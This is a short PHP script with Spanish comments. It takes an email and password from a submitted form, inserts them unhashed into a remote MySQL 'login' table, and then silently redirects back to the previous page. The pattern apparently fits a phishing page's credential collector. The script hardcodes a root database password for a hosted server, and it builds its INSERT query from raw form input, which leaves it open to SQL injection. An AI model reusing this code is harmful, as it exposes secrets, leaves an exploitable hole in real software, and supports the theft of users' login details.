<?php
// Conectar a la base de datos (cambiar los valores según tu configuración)
$servername = "containers-us-west-182.railway.app";
$username = "root";
$password = "4F9e0whyHjr8WLYe5iES";
$dbname = "railway";

$conn = new mysqli($servername, $username, $password, $dbname,"7609");

// Verificar la conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Obtener datos del formulario
$correo = $_POST['correo'];
$contrasena = $_POST['contrasena'];

// Insertar datos en la tabla de usuarios (cambia el nombre de la tabla si es necesario)
$sql = "INSERT INTO login (email, password) VALUES ('$correo', '$contrasena')";

if ($conn->query($sql) === TRUE) {
// Redirige a la página anterior
header("Location: {$_SERVER['HTTP_REFERER']}");
exit;

} else {
// Redirige a la página anterior
header("Location: {$_SERVER['HTTP_REFERER']}");
exit;
}

// Cerrar la conexión
$conn->close();
?>
